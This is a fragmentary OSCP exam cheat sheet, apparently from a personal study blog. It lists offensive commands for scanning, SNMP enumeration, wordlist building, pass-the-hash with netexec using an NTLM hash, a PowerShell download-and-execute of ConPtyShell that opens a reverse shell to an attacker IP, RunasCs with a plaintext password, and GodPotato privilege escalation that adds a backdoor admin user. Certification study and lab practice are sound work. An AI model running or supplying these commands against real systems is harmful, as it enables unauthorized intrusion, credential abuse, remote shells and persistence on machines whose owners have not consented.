...
![](assets/images/posts/2026-01-14-OSCPv3/edcb8547ca8f5927729c2f106d604139_MD5.jpeg)
...
# udp
sudo nmap -sC -sV -U -Pn ip -oN ip_udp --top-ports=100
...
sudo apt-get install snmp-mibs-downloader && snmpwalk -v2c -c public 192.168.187.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
...
cewl --lowercase http://102.168.xxx.xxx/ | grep -v CeWL > wordlists.txt
...
```shell
# xfreerdp
xfreerdp +clipboard /cert:ignore /dynamic-resolution /drive:test,/home/kali/offsec /u:user /p:password /v:ip 
...
# net
netexec winrm 10.10.102.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
```
...
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.192 -RemotePort 135 -Rows 25 -Cols 196
```

### Info
```powershell
## C:\Users\Public 으로 가서 할 것
...
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote kali_ip:443
...
.\GodPotato-NET4.exe -cmd "cmd /c net user g3rm g3rmpasswd! /add"
.\GodPotato-NET4.exe -cmd "net localgroup Administrators g3rm /add"
```
...
### ligolo
```bash
sudo ip tuntap add user parallels mode tun ligolo 
...
### msfvenom
[Payloads](https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt)   
```shell
# payloads 리스트 출력
